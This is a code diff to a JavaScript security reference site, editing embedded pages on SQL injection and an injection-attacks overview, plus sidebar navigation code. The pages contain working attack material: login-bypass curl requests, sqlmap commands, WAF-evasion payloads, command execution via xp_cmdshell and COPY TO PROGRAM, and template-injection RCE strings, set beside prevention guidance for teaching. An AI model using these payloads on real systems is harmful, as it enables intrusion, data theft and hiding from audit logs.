@@ -1820,14 +1820,9 @@ const result = await pool.query(
 \`\`\`
 `;
 
+/* CAT-01 has full content */
 
-PAGES.sqli_classic_inband = `<p>
-<span style="background:#dc3545;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CRITICAL</span>&nbsp;
-<span style="background:#6c757d;color:#fff;padding:2px 8px;border-radius:3px;">CWE-89</span>&nbsp;
-<span style="background:#6c757d;color:#fff;padding:2px 8px;border-radius:3px;">CAPEC-66</span>&nbsp;
-<span style="background:#dc3545;color:#fff;padding:2px 8px;border-radius:3px;">CVSS 9.8</span>&nbsp;
-<span style="background:#fd7e14;color:#fff;padding:2px 8px;border-radius:3px;">OWASP A03:2021</span>
-</p>
+PAGES.sqli_classic_inband = `<span style="background:#d32f2f;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CRITICAL</span> <span style="background:#f57c00;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CWE-89</span> <span style="background:#7b1fa2;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CAPEC-66</span> <span style="background:#d32f2f;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">CVSS 9.8</span> <span style="background:#1565c0;color:#fff;padding:2px 8px;border-radius:3px;font-weight:bold;">OWASP A03:2021</span>
 
 # Classic / In-Band SQL Injection
 
@@ -2109,8 +2104,8 @@ This returns the administrator row without verifying any password.
 **Option B -- curl:**
 
 \`\`\`bash
-curl -X POST 'https://LAB-URL/login' \
-  -d "username=administrator'--&password=x" \
+curl -X POST 'https://LAB-URL/login' \\
+  -d "username=administrator'--&password=x" \\
   -L -v
 \`\`\`
 
@@ -2230,10 +2225,10 @@ When input maps to \`WHERE id = $input\` (no quotes), injection requires no quot
 |----------|--------|---------|
 | MySQL | Implicit adjacent strings | \`'foo' 'bar'\` produces \`foobar\` |
 | MySQL | \`CONCAT()\` | \`CONCAT('foo','bar')\` |
-| PostgreSQL | Pipe operator | \`'foo' \|\| 'bar'\` |
+| PostgreSQL | Pipe operator | \`'foo' \\|\\| 'bar'\` |
 | MSSQL | Plus operator | \`'foo' + 'bar'\` |
-| Oracle | Pipe operator | \`'foo' \|\| 'bar'\` |
-| SQLite | Pipe operator | \`'foo' \|\| 'bar'\` |
+| Oracle | Pipe operator | \`'foo' \\|\\| 'bar'\` |
+| SQLite | Pipe operator | \`'foo' \\|\\| 'bar'\` |
 
 **Stacked queries:**
 
@@ -2501,7 +2496,7 @@ sqlmap -u "https://target.com/login" --data="username=admin&password=test" -p us
 sqlmap -u "https://target.com/page?id=1" --technique=S
 
 # Second-order testing (result visible at different URL)
-sqlmap -u "https://target.com/register" --data="username=test" \
+sqlmap -u "https://target.com/register" --data="username=test" \\
   --second-url="https://target.com/profile"
 
 # Cookie injection (level 2+)
@@ -2528,7 +2523,7 @@ sqlmap -u "URL" --level=3 --risk=2 --technique=BSQT --batch
 | \`unmagicquotes\` | Wide-byte bypass: replaces \`'\` with \`%bf%27\` |
 | \`charencode\` | URL-encodes all characters |
 | \`chardoubleencode\` | Double URL-encodes |
-| \`space2hash\` | Replaces spaces with \`#\n\` (MySQL) |
+| \`space2hash\` | Replaces spaces with \`#\\n\` (MySQL) |
 | \`versionedkeywords\` | Wraps keywords in MySQL versioned comments |
 | \`sp_password\` | Appends \`sp_password\` to suppress MSSQL audit logging |
 | \`apostrophemask\` | Replaces \`'\` with UTF-8 full-width equivalent |
@@ -2678,7 +2673,7 @@ admin'/*!50000OR*/'1'='1'#             -- MySQL: versioned comment + hash
 ' OR $$x$$=$$x$$--                     -- PostgreSQL: dollar-quoting (no single quotes)
 '; COPY (SELECT '') TO PROGRAM 'id';-- -- PostgreSQL: command via COPY TO PROGRAM
 -- MSSQL
-'; EXEC xp_cmdshell 'dir c:\'--       -- MSSQL: directory listing via xp_cmdshell
+'; EXEC xp_cmdshell 'dir c:\\'--       -- MSSQL: directory listing via xp_cmdshell
 '; DECLARE @s NVARCHAR(80); SET @s=N'SEL'+N'ECT 1'; EXEC(@s)--  -- MSSQL: string-split keyword
 SELECT [password] FROM [users] WHERE [id]=1  -- MSSQL: square bracket identifiers
 -- Oracle
@@ -2717,7 +2712,7 @@ role_admin_padded_to_overflow_column   -- Role name collision via truncation
 {"username":"' OR '1'='1'--","password":"x"}              -- Tautology via JSON body
 {"username":"' OR 1=1--","password":"x"}                  -- Numeric tautology in JSON
 -- GraphQL mutation variables
-{"query":"mutation{login(user:\"admin'--\",pass:\"x\"){token}}"}  -- GraphQL auth bypass
+{"query":"mutation{login(user:\\"admin'--\\",pass:\\"x\\"){token}}"}  -- GraphQL auth bypass
 {"variables":{"filter":"' OR 1=1--"}}                     -- GraphQL filter injection
 -- ORM raw query context (same payloads work when devs use string interpolation)
 ' OR 1=1--                             -- Works in Sequelize db.query() string template
@@ -2868,7 +2863,7 @@ Register multiple accounts with different second-order payloads. These persist i
 
 **15. Backtick/bracket identifiers:** MySQL: \`\` \`union\` \`select\` 1,2,3-- \`\`. MSSQL: \`[union] [select] 1,2,3--\`.
 
-**16. Backslash trick (fragmented injection):** Username: \`\\`. Password: \` OR 1=1#\`. The backslash escapes the closing quote, making \`' AND pass='\` a single string literal, and the OR condition runs.
+**16. Backslash trick (fragmented injection):** Username: \`\\\`. Password: \` OR 1=1#\`. The backslash escapes the closing quote, making \`' AND pass='\` a single string literal, and the OR condition runs.
 
 **17. Overlong payloads:** Exceed WAF inspection buffer (8KB-128KB depending on vendor) with junk data prefix.
 
@@ -3302,24 +3297,14 @@ switch(param) {
 \`\`\`
 `;
 
-/* CAT-01 has full content */
 CATEGORIES[0].content = "# CAT-01: Injection Attacks\n\n> **Domain:** Web Application -- **Phase:** 1 -- **CAPEC Category:** Inject Unexpected Items\n\n---\n\n## Category Overview\n\nInjection attacks occur when untrusted, attacker-controlled data is sent to an interpreter -- a database engine, OS shell, LDAP server, template engine, XML parser, or any other component that evaluates input as code or a command. The interpreter cannot distinguish between the intended instruction and the injected content, executing both.\n\nThe fundamental precondition for all injection vulnerabilities is the same: **user-controlled data is concatenated into a query, command, or expression without sufficient sanitization, parameterization, or contextual escaping.** The interpreter is working as designed -- the vulnerability is in how the application constructs the input to that interpreter.\n\n**Why it persists:** Developer trust of user input remains pervasive in legacy codebases, ORMs create false confidence, and WAF bypass techniques continuously outpace signature-based defenses. Injection was #1 on the OWASP Top 10 for over a decade and remains in the top 5 in 2025.\n\n---\n\n## Attack Surface Map\n\n```mermaid\ngraph TD\n    USER[User / Attacker Input] --> FORMS[HTML Forms]\n    USER --> PARAMS[URL Parameters]\n    USER --> HEADERS[HTTP Headers]\n    USER --> COOKIES[Cookies]\n    USER --> JSON[JSON / XML Body]\n    USER --> WSOCK[WebSocket Messages]\n    FORMS & PARAMS & HEADERS & COOKIES & JSON & WSOCK --> APP[Web Application]\n    APP --> SQL[SQL Engine]\n    APP --> NOSQL[NoSQL Engine]\n    APP --> OS[Operating System Shell]\n    APP --> LDAP[LDAP Directory]\n    APP --> XPATH[XPath / XML Parser]\n    APP --> TMPL[Template Engine]\n    APP --> EL[Expression Language]\n    APP --> LLM[LLM / AI Model]\n    SQL --> |SQLi| SQLI[Data theft - Auth bypass - RCE]\n    NOSQL --> |NoSQLi| NOSQLI[Auth bypass - Data exfiltration]\n    OS --> |CMDi| CMDI[RCE - Reverse shell]\n    LDAP --> |LDAPi| LDAPI[Auth bypass - Directory enum]\n    XPATH --> |XPathi| XPATHI[Data extraction - Auth bypass]\n    TMPL --> |SSTI| SSTII[RCE - Config read]\n    EL --> |ELi| ELI[RCE via OGNL - Spring SpEL]\n    LLM --> |Prompt Inj| PROMPTI[Goal hijack - Data exfil]\n```\n\n---\n\n## Attack Types in This Category\n\n| ID | Attack Type | Key CWEs | Subtypes | Severity |\n|----|------------|---------|---------|----------|\n| T01 | SQL Injection | CWE-89 | 12 | CRITICAL |\n| T02 | NoSQL Injection | CWE-943 | 5 | CRITICAL |\n| T03 | OS Command Injection | CWE-78 | 5 | CRITICAL |\n| T04 | SSTI | CWE-94, CWE-1336 | 9 | CRITICAL |\n| T05 | LDAP Injection | CWE-90 | 4 | HIGH |\n| T06 | XPath Injection | CWE-643 | 3 | HIGH |\n| T07 | EL / OGNL Injection | CWE-917 | 5 | CRITICAL |\n| T08 | XML Injection | CWE-91 | 4 | HIGH |\n| T09 | CRLF Injection | CWE-93, CWE-113 | 4 | HIGH |\n| T10 | Code Injection | CWE-94, CWE-95 | 5 | CRITICAL |\n| T11 | ORM Injection | CWE-89 | 4 | HIGH |\n| T12 | JSON Injection | CWE-74 | 4 | MEDIUM |\n| T13 | HTML Injection | CWE-79, CWE-80 | 3 | MEDIUM |\n| T14 | SMTP Injection | CWE-93 | 4 | MEDIUM |\n| T15 | Prompt Injection | CWE-1427 | 6 | HIGH |\n\n---\n\n## Universal Injection Pattern\n\nAll injection attacks share the same structural vulnerability:\n\n```\nVULNERABLE:\nquery = \"SELECT * FROM users WHERE id = \" + userInput\nuserInput = \"1 OR 1=1--\"\nquery = \"SELECT * FROM users WHERE id = 1 OR 1=1--\"  <-- Logic altered\n\nSECURE:\nquery = \"SELECT * FROM users WHERE id = ?\"\nexecute(query, [userInput])\nuserInput is data, never code -- interpreter separation maintained\n```\n\n---\n\n## Detection Heuristics (All Injection Types)\n\n| Probe Type | Payload Pattern | Indicator |\n|-----------|----------------|----------|\n| Error-based | `'`, `\"`, `)`, `` ` `` | Interpreter error in response |\n| Boolean differential | `AND 1=1`, `AND 1=2` | Different response content |\n| Time-based | `SLEEP(5)`, `WAITFOR DELAY` | Delayed response |\n| Out-of-band | DNS/HTTP callback payloads | External request received |\n| Syntax probe | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` | `49` in response (SSTI/EL) |\n\n---\n\n## Injection by Interpreter\n\n<details>\n<summary><b>SQL -- Database Engines</b></summary>\n\n| Engine | Characteristic Syntax | Time Delay | Comment |\n|--------|----------------------|-----------|--------|\n| MySQL | `SLEEP(N)`, `-- -` | `SLEEP(5)` | `#` comment also works |\n| PostgreSQL | `pg_sleep(N)`, `--` | `pg_sleep(5)` | Stacked queries with `;` |\n| MSSQL | `WAITFOR DELAY`, `--` | `WAITFOR DELAY '0:0:5'` | `xp_cmdshell` for RCE |\n| Oracle | `dbms_pipe.receive_message` | `dbms_pipe.receive_message(('a'),5)` | No stacked queries |\n| SQLite | `randomblob(N)` | `randomblob(500000000)` | Limited OOB options |\n\n</details>\n\n<details>\n<summary><b>SSTI -- Template Engines by Language</b></summary>\n\n| Engine | Language | Probe | RCE Payload Pattern |\n|--------|----------|-------|-------------------|\n| Jinja2 | Python | `{{7*7}}` | `{{''.__class__.__mro__[1].__subclasses__()}}` |\n| Twig | PHP | `{{7*7}}` | `{{_self.env.registerUndefinedFilterCallback('exec')}}` |\n| Freemarker | Java | `${7*7}` | `<#assign ex=\"freemarker.template.utility.Execute\"?new()>` |\n| Velocity | Java | `#set($x=7*7)$x` | Reflection-based RCE |\n| Smarty | PHP | `{php}phpinfo();{/php}` | Direct PHP execution (legacy) |\n| ERB | Ruby | `<%= 7*7 %>` | `<%= system('id') %>` |\n\n</details>\n\n---\n\n## Prevention -- Universal Principles\n\n1. **Parameterized Queries / Prepared Statements** -- for all database interactions\n2. **Contextual Output Encoding** -- HTML, JS, URL, CSS context-aware escaping\n3. **Input Validation** -- allowlist approach for known-good values\n4. **Principle of Least Privilege** -- database accounts with minimal permissions\n5. **WAF as defense-in-depth** -- never as primary control\n6. **ORM safely** -- avoid raw query methods\n7. **Sandboxed template engines** -- no user-controlled template content\n\n---\n\n## References\n\n### Primary Standards\n- [OWASP -- Injection (A05:2025)](https://owasp.org/Top10/2025/A05_2025-Injection/)\n- [OWASP WSTG -- Testing for Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)\n- [CWE-74: Improper Neutralization](https://cwe.mitre.org/data/definitions/74.html)\n- [CAPEC-152: Inject Unexpected Items](https://capec.mitre.org/data/definitions/152.html)\n\n### Deep Research\n- [PortSwigger -- SQL Injection](https://portswigger.net/web-security/sql-injection)\n- [PortSwigger -- SSTI](https://portswigger.net/research/server-side-template-injection)\n- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)";
 
 
 var SUBTYPE_ROUTES = {
   'cat-01:SQL Injection': 'sqli-classic-inband'
 };
-var SUBTYPE_CHILDREN = {
-  'cat-01:SQL Injection': [
-    {name: 'Classic / In-Band', slug: 'sqli-classic-inband'},
-    {name: 'Boolean-Based Blind', slug: 'sqli-blind-boolean'}
-  ]
-};
 function getSubtypeSlug(catSlug, typeName) {
   return SUBTYPE_ROUTES[catSlug + ':' + typeName] || null;
-}
-function getSubtypeChildren(catSlug, typeName) {
-  return SUBTYPE_CHILDREN[catSlug + ':' + typeName] || null;
 }
 
 /* ===== SHIELD.IO STRIPPING (FIX 2) ===== */
@@ -3501,13 +3486,7 @@ function buildSidebar() {
     html += '<div class="sidebar-sub-items" id="sub-' + cat.slug + '">';
     for (var j = 0; j < cat.types.length; j++) {
       var subSlug = getSubtypeSlug(cat.slug, cat.types[j]);
-      var children = getSubtypeChildren(cat.slug, cat.types[j]);
-      if (children && children.length > 0) {
-        html += '<div class="sidebar-sub-item" style="cursor:pointer;" onclick="navigateTo(\'' + children[0].slug + '\')">' + escapeHtml(cat.types[j]) + '</div>';
-        for (var k = 0; k < children.length; k++) {
-          html += '<div class="sidebar-sub-item" style="cursor:pointer;padding-left:52px;font-size:10px;" onclick="event.stopPropagation();navigateTo(\'' + children[k].slug + '\')">' + escapeHtml(children[k].name) + ' <span style="color:#33cc33;font-size:9px;">\u2713</span></div>';
-        }
-      } else if (subSlug) {
+      if (subSlug) {
         html += '<div class="sidebar-sub-item" style="cursor:pointer;" onclick="navigateTo(\'' + subSlug + '\')">' + escapeHtml(cat.types[j]) + '</div>';
       } else {
         html += '<div class="sidebar-sub-item">' + escapeHtml(cat.types[j]) + '</div>';
